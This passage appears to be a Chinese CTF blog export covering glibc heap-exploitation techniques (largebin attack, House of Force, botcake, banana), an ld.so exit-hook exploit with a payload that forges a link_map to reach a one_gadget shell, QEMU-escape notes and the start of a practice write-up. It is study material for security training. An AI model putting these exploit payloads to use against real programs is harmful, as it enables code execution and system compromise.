<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初状态 unsortedbin --&gt; chunk_victim  </span></span><br><span class="line">&gt; 此时我们令chunk_victim.bk = fake_chunk_head</span><br><span class="line"></span><br><span class="line"><span class="comment"># 末状态 unsortedbin --&gt; chunk_victim --&gt; fake_chunk</span></span><br><span class="line">&gt; 连续申请两个chunk即可申请到fake_chunk</span><br></pre></td></tr></table></figure>
<h2 id="largebin-attack">[7-4] Largebin Attack</h2>
<h3 id="概述-5">[7-4-1] 概述</h3>
<p>Largebin 是 FIFO 的双向链表，chunk 结构为👇 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------</span><br><span class="line">|        prev_size       |      size       |0|0|1|| </span><br><span class="line">|------------------------|------------------------|</span><br><span class="line">|           fd           |           bk           |</span><br><span class="line">|------------------------|------------------------|</span><br><span class="line">|       fd_nextsize      |       bk_nextsize      |</span><br><span class="line">|------------------------|------------------------|</span><br><span class="line">|                    user_data                    |</span><br><span class="line">|                      . . .                      |</span><br><span class="line">---------------------------------------------------</span><br></pre></td></tr></table></figure></p>
<h3 id="leak-3">[7-4-2] leak</h3>
<h3 id="write-3">[7-4-3] write</h3>
<h4 id="对-libc-有要求">[7-4-3-1] 对 libc 有要求</h4>
<blockquote>
<p>libc: 2.30 及以前？</p>
</blockquote>
<h4 id="对-libc-没要求">[7-4-3-2] 对 libc 没要求</h4>
<blockquote>
<p>libc: Any</p>
</blockquote>
<p>概述：</p>
<p>通过修改 largebin 中的 bk_nextsize 为 target_addr - 0x20，可以在
target_addr 处写一个堆地址</p>
<p>POC： <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x500</span>)  <span class="comment">// chunk1</span></span><br><span class="line">alloc(<span class="number">0x10</span>)   <span class="comment">// gap1 防止合并</span></span><br><span class="line">alloc(<span class="number">0x510</span>)  <span class="comment">// chunk2</span></span><br><span class="line">alloc(<span class="number">0x10</span>)   <span class="comment">// gap2 防止合并</span></span><br><span class="line"><span class="built_in">free</span>(chunk1)  <span class="comment">// chunk1 进入 unsortedbin</span></span><br><span class="line">alloc(<span class="number">0x520</span>)  <span class="comment">// chunk1 进入 largebin</span></span><br><span class="line"><span class="built_in">free</span>(chunk2)  <span class="comment">// chunk2 进入 unsortedbin</span></span><br><span class="line">chunk1.bk_nextsize = target_addr - <span class="number">0x20</span> <span class="comment">// UAF等方法修改 chunk</span></span><br><span class="line">alloc(<span class="number">0x520</span>)  <span class="comment">// chunk2 进入 largebin，触发 largebin attack</span></span><br><span class="line">                        <span class="comment">// target_addr 处被写入 chunk2 的地址</span></span><br></pre></td></tr></table></figure></p>
<h1 id="series-of-house">[8] Series of House</h1>
<h2 id="house-of-orange">[8-1] House of Orange</h2>
<h3 id="概述-6">[8-1-1] 概述</h3>
<p>HouseofOrange是在程序没有可以操控的free时，利用ptmalloc的管理机制强行制造出一个unsortedbin中的chunk的技术。</p>
<h3 id="伪造chunk需求">[8-1-2] 伪造chunk需求</h3>
<ol type="1">
<li><p>top_chunk的结束地址必须页对齐</p>
<ul>
<li>一般情况下，ptmalloc设置top_chunk为0x21000，我们申请一个0x10的chunk0后，chunk0加上chunk_head是0x20大小，此时top_chunk切割后还剩下0x20fe0大小，为了页对齐，我们伪造top_chunk的大小为0xfe0即可</li>
</ul></li>
<li><p>top_chunk.size &gt;= MINSIZE</p></li>
<li><p>top_chunk.size &lt; chunk_size + MINSIZE</p></li>
<li><p>top_chunk.prev_inuse == 1</p>
<ul>
<li>第一点中说的0xfe0要变为0xfe1</li>
</ul></li>
</ol>
<h2 id="house-of-force-hof">[8-2] House of Force (HOF)</h2>
<h3 id="概述-7">[8-2-1] 概述</h3>
<p>House of Force 是通过 topchunk 来实现任意地址写的操作。</p>
<p>具体来说，我们先修改 topchunk 的 size 域，接着用 malloc(c_size) 从
topchunk 切割一个 chunkF，在切割前，通过构造 malloc chunkF 时的
c_size，能改变 main_arena 中指向 topchunk
的指针为任意值，从而在切割时能在任意地址申请一个
chunk，进而实现任意地址写。</p>
<h3 id="具体原理">[8-2-2] 具体原理</h3>
<ul>
<li><p>从 topchunk 申请 chunk
的具体实现是这样的，其中的代码可以这样理解(我没读源码，只是从应用角度逆推原理):</p>
<ul>
<li><p>⚠注：本段代码的数据全为 unsigned，也就是说，我们要申请的 chunk 的
size 即 nb 会被转化为无符号，topchunk 的 size 也是无符号的</p></li>
<li><p>victim: 获取指向目标 chunk 的指针，在这是 topchunk</p></li>
<li><p>chunksize(victim): 获取 victim 指向的 chunk 的大小</p></li>
<li><p>nb: chunk 的实际大小，malloc(size) 时 nb = request2size(size)
<code>这个地方我也没搞清楚，主要有的时候nextchunk的prev_size域也被拿来当作chunk的一部分，就导致我不是很清楚对齐这一块怎么做的，后面仔细读一下源码再来订正</code></p></li>
<li><p>chunk_at_offset(victim, nb): return(victim + nb)</p></li>
</ul></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = chunksize(victim);</span><br><span class="line"><span class="comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) </span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>House of Force 逻辑如下：</p>
</blockquote>
<p>首先通过堆溢出之类的手段，改变 topchunk 的 size 域为
-1，即0xffffffffffffffff</p>
<p>在 <code>chunkFakealloc(size)</code> 时，通过构造
size（由于<code>nb = request2size(size)</code>,所以构造 nb
的本质就是构造 size），切割程序会运行到如下代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">av-&gt;top        = remainder;</span><br></pre></td></tr></table></figure>
<p>此时，remainder 会被赋值为 victim + nb，而下一行代码
<code>av-&gt;top = remainder</code> 使得 main_arena 中指向 topchunk
的指针被修改</p>
<p>值得注意的是，若 nb 为负数，victim + nb 会溢出，从而将 victim
修改为比 victim 自己指向的地址更低的地址。</p>
<p>也就是说，通过构造 nb，我们可以将 av-&gt;top 改写为
<code>Any Address</code></p>
<p>而通过再一次的 <code>chunkNewalloc(nb)</code>，我们就可以在
<code>Any Address</code> 处申请一个 chunk，进而实现任意地址写.</p>
<p>总而言之，在改变 topchunk 的 size 域为 -1 之后，只要我们能够精心构造
<code>malloc(nb)</code> 时的 nb，就可以实现任意地址写。</p>
<p>那么接下来的问题很显然，如何构造 nb ，也就是如何构造 size？</p>
<blockquote>
<p>size 的构造</p>
</blockquote>
<p>malloc 的过程中会遇到如下检查，<code>req</code>就是我们申请的 chunk
的大小，就是前文提到的 request2size的参数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// MINSIZE = 2 * SIZE_SZ</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br></pre></td></tr></table></figure>
<p>其中，<code>SIZE_SZ</code> 在 64 位是 0x08，32 位为 0x04，因此
<code>MINSIZE</code> 在 64 位中是 0x10，32 位为 0x08</p>
<p>由于 -2 * MINSIZE 被转化为了无符号数，拿 64 位举例，req 很难超过
0xfffffffffffffff0
这么大的数字，所以这个检测是很好绕过的，或者说根本不用 care
这个检测。</p>
<p>接下来，<code>req</code>会经过如下函数，转化为要申请的 chunk 的 真实
size，也就是 nb</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure>
<p>其中，<code>MALLOC_ALIGN_MASK</code> 在 64 位是 0xF 即 1111b，32位为
0x7 即 111b.</p>
<p><code>这里有点没想明白 request2size 的过程，我先假设在 malloc(size) 时，nb = request2size(req) = request2size(size)</code></p>
<p>由于 nb 都是对齐的，所以我们可以不用考虑
<code>&amp; ~MALLOC_ALIGN_MASK</code>，所以 size = req = nb - SIZE_SZ -
MALLOC_ALIGN_MASK</p>
<p>至此，我们构造出了 size，HOF结束.</p>
<h2 id="house-of-botcake">[8-3] House of botcake</h2>
<blockquote>
<p>libc: 2.29 -</p>
</blockquote>
<h3 id="概述-8">[8-3-1] 概述</h3>
<p>由于 libc 2.29 之后加入了 tcachebin 检查机制，所以 tcachebin double
free 变得没有那么好利用</p>
<p>但由于放入 unsortedbin 中的 chunk，再被 free 进 tcachebin
的时候检测相当薄弱</p>
<p>所以我们可以先把 chunk free 进 unsortedbin，再 free 进
tcachebin，当我们切割 unsortedbin 时就能修改 tcachebin 里重叠的 chunk 的
fd/bk，造成 tcachebin poisoning</p>
<h3 id="poc-1">[8-3-2] POC</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    malloc(<span class="number">0x80</span>) <span class="comment"># idx0-6: tcache | idx7,8:unsorted</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment"># idx9: 防止 unsortedbin 与 topchunk 合并</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i) <span class="comment"># idx0-6: tcache</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">7</span>) <span class="comment"># chunk7 后向合并 chunk8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 tcachebin[0x80] 取出一个 chunk，此时 tcachebin 链只剩六个 chunk</span></span><br><span class="line">malloc(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把本在 unsortedbin 中的 chunk8 放入 tcachebin</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 chunk7,8 切割，但实际上已经覆盖了 tcachebin chunk8 的 fd/bk 指针了</span></span><br><span class="line">malloc(<span class="number">0xa0</span>) </span><br></pre></td></tr></table></figure>
<h3 id="一些疑问">[8-3-3] 一些疑问</h3>
<p>不构造 chunk 7，直接把 chunk8 放进 unsortedbin 再放进 tcachebin
中是完全可行的，但当我切割 chunk8 时就会报错
<code>malloc(): unsorted double linked list corrupted\n</code></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x55dd5ca32690</span> —▸ <span class="number">0x55dd5ca32570</span> —▸ <span class="number">0x55dd5ca324e0</span> —▸ <span class="number">0x55dd5ca32450</span> —▸ <span class="number">0x55dd5ca323c0</span> —▸ <span class="number">0x55dd5ca32330</span> —▸ <span class="number">0x55dd5ca322a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted] <span class="comment">// 或许跟这里有关系？</span></span><br><span class="line"><span class="attr">FD</span>: <span class="number">0x55dd5ca32680</span> —▸ <span class="number">0x55dd5ca32570</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="attr">BK</span>: <span class="number">0x55dd5ca32680</span> —▸ <span class="number">0x55dd5ca32010</span> ◂— <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>目前猜测是: 直接把 chunk8 放进 tcachebin 会导致原本存在 chunk8 fd/bk
处的 &amp;main_arena+88 被替换，导致 malloc 错误</p>
<h2 id="house-of-banana">[8-4] House of banana</h2>
<p>具体细节可以看这篇<a
href="https://www.secpulse.com/archives/180765.html">文章</a></p>
<h3 id="概述-9">[8-4-1] 概述</h3>
<p>当程序显式调用<code>exit()</code>函数时，程序会通过<code>exit -&gt; _dl_fini -&gt;((fini_t) array[i]) ()</code>这条调用链调用
<code>array[i]()</code>。</p>
<p>而 <code>array[i]()</code> 是通过
<code>_rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</code>
定位的</p>
<p>通过 largebin
attack，我们可以篡改<code>_rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</code>指针，将其值修改为我们可以控制的堆地址，</p>
<p>而通过在堆上伪造一个 link_map 结构体，我们可以欺骗程序，使其执行
<code>array[i]()</code> 时执行在结构体里放入的提权函数，进而提权</p>
<h3 id="poc-2">[8-4-2] POC</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># largebin attack 修改 _rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 fake chunk</span></span><br></pre></td></tr></table></figure>
<h3 id="如何构造-fake_chunk">[8-4-3] 如何构造 fake_chunk?</h3>
<p>见 <a
href="https://heygap.github.io/2024/02/15/Pwn%20-%20IO_File%20and%20ld.so%20exploit%20summary/#more">Pwn
- IO_File and ld.so exploit summary</a></p>
<h2 id="house-of-pig">[8-5] House of pig</h2>
<p>https://bbs.kanxue.com/thread-268245.htm#msg_header_h3_2</p>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Heap</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - IO_File and ld.so exploit summary</title>
    <url>/2024/02/15/Pwn%20-%20IO_File%20and%20ld.so%20exploit%20summary/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
IO_File 与 ld.so 利用总结
</blockquote>
<span id="more"></span>
<h1 id="io_file">[1] IO_File</h1>
<h1 id="ld.so">[2] ld.so</h1>
<h2 id="rtld_global._dl_ns._ns_loaded">[2-1]
_rtld_global._dl_ns._ns_loaded</h2>
<h3 id="原理">[2-1-1] 原理</h3>
<p>程序在调用<code>exit()</code>退出时，会调用<code>(待调试)</code>，而我们可以通过修改
<code>_rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</code></p>
<h3 id="找偏移量">[2-1-2] 找偏移量</h3>
<blockquote>
<p>恢复调试符号请看<a
href="https://heygap.github.io/2023/09/22/Pwn%20-%20Heap%20Exploit%20Summary/#more">Pwn
- Heap Exploit Summary</a> 的 patchelf 部分</p>
</blockquote>
<p>恢复调试符号以后，在 pwndbg 中输入 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找 &amp;(_rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next) </span></span><br><span class="line"><span class="comment"># 与 &amp;(_rtld_global) 之间的偏移量</span></span><br><span class="line">pwndbg&gt; distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span><br><span class="line">0x7f992b424040-&gt;0x7f992b3f3018 is -0x31028 bytes (-0x6205 words)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找 _rtld_global 的真实地址</span></span><br><span class="line">pwndbg&gt; p &amp;_rtld_global</span><br><span class="line"><span class="variable">$1</span> = (struct rtld_global *) 0x7f8bb8255040 &lt;_rtld_global&gt;</span><br><span class="line"><span class="comment"># 若本次运行的 libc_base 为 0x7f8bb803a000</span></span><br><span class="line"><span class="comment"># 则 offset = 0x7f8bb8255040 - 0x7f8bb803a000 = 0x21b040</span></span><br><span class="line"><span class="comment"># 这个 offset 会在下面的 python 代码中用到</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 计算 _rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next 的真实地址</span></span><br><span class="line">rtld_global = libc_base + offset</span><br><span class="line">rtld_next_next_next = rtld_global -<span class="number">0x31028</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># largebin attack 中</span></span><br><span class="line">target_addr = rtld_next_next_next</span><br><span class="line"><span class="comment"># 修改 chunk.bk_nextsize 时</span></span><br><span class="line">chunk.bk_nextsize = rtld_next_next_next - <span class="number">0x20</span></span><br></pre></td></tr></table></figure>
<p>largebin attack 以后，观察 _rtld_global，应该有这样一条链
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_rtld_global._dl_ns._ns_loaded        = 0x7f... head_node</span><br><span class="line">              |</span><br><span class="line">              |  (*_ns_loaded) + 0x18</span><br><span class="line">              v</span><br><span class="line">_rtld_global._dl_ns._ns_loaded.l_next = 0x7f... node_1</span><br><span class="line">              |</span><br><span class="line">              |  (*(xx.l_next)) + 0x18</span><br><span class="line">              v</span><br><span class="line">..._ns_loaded.l_next-&gt;l_next          = 0x7f... node_2</span><br><span class="line">              |</span><br><span class="line">              |  (*(xx-&gt;l_next)) + 0x18</span><br><span class="line">              v</span><br><span class="line">...l_next-&gt;l_next-&gt;l_next             = 0x55...(堆地址) node_3</span><br><span class="line"># 链上正好四个 node</span><br></pre></td></tr></table></figure></p>
<h3 id="构造-fake-chunk">[2-1-3] 构造 fake chunk</h3>
<p>我们假设： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                    |-----------|-----------|</span><br><span class="line">fake_rtld_global -&gt; | perv_size |    size   |</span><br><span class="line">                    |-----------|-----------|</span><br><span class="line">                    |       user_data       |</span><br><span class="line">                    |         . . .         |</span><br><span class="line">                    |-----------|-----------|</span><br></pre></td></tr></table></figure></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 我看的 wp 大多数都在构造 fake chunk 时用到了 libc + 一个偏移量,</span></span><br><span class="line"><span class="comment"># 但我这样构造也能 getshell,</span></span><br><span class="line"><span class="comment"># 以下就只需要修改 heap_base 和 offset 就行,</span></span><br><span class="line"><span class="comment"># 对 libc 的要求小了很多.</span></span><br><span class="line">heap_base = 堆的基地址</span><br><span class="line">offset    = fake chunk 的 prev_size 地址</span><br><span class="line">fake_rtld_global = heap_base + offset</span><br><span class="line">payload  = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(fake_rtld_global)</span><br><span class="line">payload  = payload.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(fake_rtld_global + <span class="number">0x58</span>) + p64(<span class="number">0x8</span>) + p64(one_gadget[<span class="number">0</span>])</span><br><span class="line">payload  = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(fake_rtld_global + <span class="number">0x40</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(fake_rtld_global + <span class="number">0x48</span>)</span><br><span class="line">payload  = payload.ljust(<span class="number">0x30c</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x1c</span>)</span><br></pre></td></tr></table></figure>
<p>最后构造的 chunk 应该如下</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tele 0x5644419bbcd0 40</span><br><span class="line">00:0000│  0x5644419bbcd0 ◂— 0x0</span><br><span class="line">01:0008│  0x5644419bbcd8 ◂— 0x521</span><br><span class="line">02:0010│  0x5644419bbce0 ◂— 0x0</span><br><span class="line">... ↓     2 skipped</span><br><span class="line">05:0028│  0x5644419bbcf8 —▸ 0x5644419bbcd0 ◂— 0x0</span><br><span class="line">06:0030│  0x5644419bbd00 ◂— 0x0</span><br><span class="line">... ↓     2 skipped</span><br><span class="line">09:0048│  0x5644419bbd18 —▸ 0x5644419bbd28 —▸ 0x7f77ff49154c (execvpe+652) ◂— mov rdx, r12</span><br><span class="line">0a:0050│  0x5644419bbd20 ◂— 0x8</span><br><span class="line">0b:0058│  0x5644419bbd28 —▸ 0x7f77ff49154c (execvpe+652) ◂— mov rdx, r12</span><br><span class="line">0c:0060│  0x5644419bbd30 ◂— 0x0</span><br><span class="line">... ↓     21 skipped</span><br><span class="line">22:0110│  0x5644419bbde0 —▸ 0x5644419bbd10 ◂— 0x0</span><br><span class="line">23:0118│  0x5644419bbde8 ◂— 0x0</span><br><span class="line">24:0120│  0x5644419bbdf0 —▸ 0x5644419bbd18 —▸ 0x5644419bbd28 —▸ 0x7f77ff49154c (execvpe+652) ◂— mov rdx, r12</span><br><span class="line">25:0128│  0x5644419bbdf8 ◂— 0x0</span><br><span class="line">... ↓     2 skipped</span><br></pre></td></tr></table></figure>
<h2 id="rtld_global.exit_hook">[2-2] _rtld_global.exit_hook</h2>
<blockquote>
<p>libc: 2.23 / 2.27 (其他版本未记录)</p>
</blockquote>
<h3 id="exit_hook-调用链">[2-2-1] exit_hook 调用链</h3>
<p>exit --&gt; __run_exit_handlers --&gt; _dl_fini --&gt;
__rtld_lock_lock_recursive / __rtld_lock_unlock_recursive</p>
<h3 id="poc">[2-2-2] POC</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gdb 中输入</span></span><br><span class="line">p _rtld_global # 查看 exit_hook 调用的两个 recursive 函数的地址</span><br><span class="line"></span><br><span class="line">p __rtld_lock_unlock_recursive # 查看 __rtld_lock_unlock_recursive 指向的数据</span><br></pre></td></tr></table></figure>
<p>libc2.23 中：</p>
<p>exit_hook_addr = libc_base+0x5f0040+3848</p>
<p>exit_hook_addr = libc_base+0x5f0040+3856</p>
<p>在libc-2.27中</p>
<p>exit_hook_addr = libc_base+0x619060+3840</p>
<p>exit_hook_addr = libc_base+0x619060+3848</p>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - QEMUescape</title>
    <url>/2024/02/18/Pwn%20-%20QEMUescape/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
总结一下 QEMUescape 的相关内容，便于后续调用
</blockquote>
<span id="more"></span>
<p>我打 pwn 题的配置是 x86-64 | Win11 | WSL2:
kali-linux，所以本篇内容主要以此为基础.</p>
<h1 id="目录">[0] 目录</h1>
<h1 id="docker">[1] Docker</h1>
<h2 id="installation">[1-1] Installation</h2>
<p><a href="https://docs.docker.com/desktop/wsl/">Installation: HOW to
use docker in WSL 2?</a></p>
<h2 id="utils">[1-2] Utils</h2>
<h3 id="常用命令">[1-2-1] 常用命令</h3>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 搭建 docker 环境</span></span><br><span class="line"><span class="comment"># 以下三条命令均在 docker-compose.yml 同目录下执行</span></span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 docker 容器</span></span><br><span class="line">docker-compose up</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭 docker 容器</span></span><br><span class="line">docker-compose down</span><br><span class="line"></span><br><span class="line"><span class="comment"># 若已经执行 docker-compose build</span></span><br><span class="line"><span class="comment"># 则可以在任意目录执行以下命令</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看容器</span></span><br><span class="line">docker ps -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动容器</span></span><br><span class="line">docker start 容器ID/名称</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -ti 容器ID /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从主机拷贝到 docker</span></span><br><span class="line">docker <span class="built_in">cp</span> /path/to/rootfs.cpio &lt;container_name_or_id&gt;:/tmp/rootfs.cpio</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭容器</span></span><br><span class="line">docker stop 容器ID/名称</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清理不需要的 images</span></span><br><span class="line">docker system <span class="built_in">df</span>   <span class="comment"># 查看 docker 占用空间</span></span><br><span class="line">docker image prune <span class="comment"># 清理未被任何容器使用的镜像</span></span><br></pre></td></tr></table></figure>
<h1 id="qemu">[2] QEMU</h1>
<h2 id="args">[2-1] Args</h2>
<ol type="1">
<li><p><code>qemu-system-x86_64 -help</code></p></li>
<li><p><a
href="https://www.qemu.org/docs/master/system/introduction.html">官方
docs</a></p></li>
<li><p>GPT</p></li>
</ol>
<h1 id="escape">[3] Escape</h1>
<h2 id="阅读dockerfile">[3-1] 阅读Dockerfile</h2>
<h2 id="确认存在漏洞的设备">[3-2] 确认存在漏洞的设备</h2>
<p>QEMU 逃逸的题目一般都是通过某个设备的读写来进行，我们需要查看启动
qemu 时 -device 参数是什么，从而确定设备名称</p>
<h2 id="section">[3-3]</h2>
<h1 id="nan-reference">[NaN] REFERENCE</h1>
<p><a
href="https://www.cnblogs.com/LynneHuan/p/17822138.html">使用docker调试和部署pwn题</a></p>
<p><a
href="https://zhuanlan.zhihu.com/p/614513965">宸极实验室—『杂项』Docker
逃逸方法汇总</a></p>
<p><a href="https://l0tus.vip/cn/qemu_escape/">qemu_escape by
I0tus</a></p>
<p><a
href="http://www.cynosure.top/2022/01/25/RWCTF2022-be-a-docker-escaper/"></a></p>
<p><a
href="https://blog.csdn.net/llovewuzhengzi/article/details/134528138">QEMU
MR相关</a></p>
<p><a
href="https://pig-007.github.io/2021/08/14/qemu%E9%80%83%E9%80%B8-pwn%E8%A7%A3%E9%A2%98/">QEMU漏洞详细分析
PIG007</a></p>
<p><a
href="https://eqqie.cn/index.php/archives/1834">经典题型存档</a></p>
<p><a href="https://www.jianshu.com/p/f08e34cf08ad">调试 与
exp.py传远程</a></p>
<p><a
href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/">不附加exp的调试</a></p>
<p><a
href="https://www.anquanke.com/post/id/254906">很好的分析文章</a></p>
<p><a
href="https://www.giantbranch.cn/2020/01/15/CTF%20QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/">好多题好多题好多题</a></p>
<p><a
href="https://xz.aliyun.com/t/5773?time__1311=n4%2BxnD07DtKxyjFD%2FiTY8xmx7u4Wuq0QYeY4D&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F">好文章</a></p>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>QEMU escape</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Practice1</title>
    <url>/2023/08/14/Pwn%20-%20Practice1/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
练习题 wp 记录
</blockquote>
<span id="more"></span>
<h1 id="目录">目录</h1>
<ul>
<li><a href="#0x00-tools-in-pwn">Tools in pwn</a></li>
<li><a href="#0x01-buuctf-babyheap_0ctf_2017">buuctf
babyheap_0ctf_2017</a></li>
<li><a href="#0x02-buuctf-ogeek2019babyrop_wp">buuctf
ogeek2019babyrop_wp</a></li>
<li><a href="#0x03-buuctf-hitcontraining_bamboobox">buuctf
hitcontraining_bamboobox</a></li>
</ul>
<h1 id="x00-tools-in-pwn">0x00 Tools in Pwn</h1>
<h2 id="pwndbg">pwndbg</h2>
<ol type="1">
<li><p>gdb.attach(io,'xxx')</p>
<ol type="1">
<li>xxx 为 GDB 的调试语句，比如'b main' 或者 'n 285'</li>
</ol></li>
</ol>
<h2 id="gadgets">gadgets</h2>
<h3 id="ropgadget">ROPgadget</h3>
<ol type="1">
<li><p>面向 elf 文件使用，详情RTFM<code>ROPgadget -h</code></p></li>
<li><p>命令省流</p>
<ol type="1">
<li><p><code>ROPgadget --binary ./pwn --only "pop|ret" | grep rdi</code></p></li>
<li><p><code>ROPgadget --binary ./pwn --string 'sh'</code></p></li>
</ol></li>
</ol>
<h3 id="one_gadget">one_gadget</h3>
<ol type="1">
<li><p>面向 libc 库使用</p></li>
<li><p>命令 <code>one_gadget ./libc.so.6</code></p></li>
</ol>
<h2 id="seccomp-tools">seccomp-tools</h2>
<ol type="1">
<li><p>面向 elf 文件使用</p></li>
<li><p>命令 <code>seccomp-tools dump ./pwn</code></p></li>
</ol>
<blockquote class="blockquote-center">
第一道Heap，插个里程碑纪念一下XD
</blockquote>
<h1 id="x01-buuctf-babyheap_0ctf_2017">0x01 BUUCTF
babyheap_0ctf_2017</h1>
<h2 id="写在前面">0. 写在前面</h2>
<p>七月学完栈溢出，ak掉buu前两页的所有栈题<br />
八月本来是想把堆学穿，等回想起这个目标前半个月已经没了<br />
参加了个数据安全的夏令营<br />
